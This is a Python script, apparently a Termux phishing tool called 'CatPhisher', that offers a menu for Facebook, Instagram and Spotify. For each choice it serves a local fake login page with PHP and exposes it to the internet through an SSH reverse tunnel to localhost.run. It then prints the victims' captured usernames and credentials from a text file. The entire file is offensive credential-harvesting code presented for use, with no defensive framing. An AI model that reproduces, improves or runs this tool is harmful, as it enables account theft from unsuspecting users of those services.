import pyfiglet
import time
import os
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'
os.system("clear")
print(MAGENTA+" ▄───▄ ")
print(" █▀█▀█    ╭━━━╮╱╱╭╮╭━━━┳╮╱╱╱╱╱╭╮")
print(" █▄█▄█    ┃╭━╮┃╱╭╯╰┫╭━╮┃┃╱╱╱╱╱┃┃")
print(" ─███──▄▄ ┃┃╱╰╋━┻╮╭┫╰━╯┃╰━┳┳━━┫╰━┳━━┳━╮")
print(" ─████▐█─█┃┃╱╭┫╭╮┃┃┃╭━━┫╭╮┣┫━━┫╭╮┃┃━┫╭╯")
print(" ─████───█╰━━━┻╯╰┻━┻╯╱╱╰╯╰┻┻━━┻╯╰┻━━┻╯")
print(" ─▀▀▀▀▀▀▀",RED+"By L.C.A HACK")
print(RESET)
def menu():
	print("1.Facebook\n2.Instagram\n3.Spotify\n4.Salir")

menu()

while True:
	opcion=int(input(RED+">> "))
	if opcion==1:
		print(YELLOW+"Iniciando servidor Localhost en php")
		time.sleep(3)
		print(GREEN+"Servidor LocalHost listo:)")
		time.sleep(1.5)
		os.chdir("web")
		os.chdir("facebook")
		os.system("php -S localhost:8080 &")
		os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
		print(YELLOW+"Credenciales Captutadas:)")
		print(WHITE)
		with open("/data/data/com.termux/files/home/CatPhisher/web/facebook/usernames.txt","r") as archivo:
			for linea in archivo:
				print(linea)

	if opcion==2:
		print(YELLOW+"Iniciando servidor Localhost en php:)")
		time.sleep(3)
		print(GREEN+"Servidor LocalHost listo:)")
		time.sleep(0.5)
		os.chdir("web")
		os.chdir("instagram")
		os.system("php -S localhost:8080 &")
		os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
		print(YELLOW+"Credenciales capturadas:)")
		print(WHITE)
		with open("/data/data/com.termux/files/home/CatPhisher/web/instagram/usernames.txt","r")as archivo:
			for linea in archivo:
				print(linea)


	if opcion==3:
		print(YELLOW+"Iniciando servidor Localhost en php:)")
		time.sleep(3)
		print(GREEN+"Servidor LocalHost listo:)")
		time.sleep(0.5)
		os.chdir("web")
		os.chdir("spotify")
		os.system("php -S localhost:8080 &")
		os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
		print(YELLOW+"Credenciales capturadas:)")
		print(WHITE)
		with open("/data/data/com.termux/files/home/CatPhisher/web/spotify/usernames.txt","r") as archivo:
		    for linea in archivo:
		        print(linea)
	if opcion==4:
		os.system("clear")
		p =pyfiglet.figlet_format("Good Bye")
		print(CYAN+p)
		break

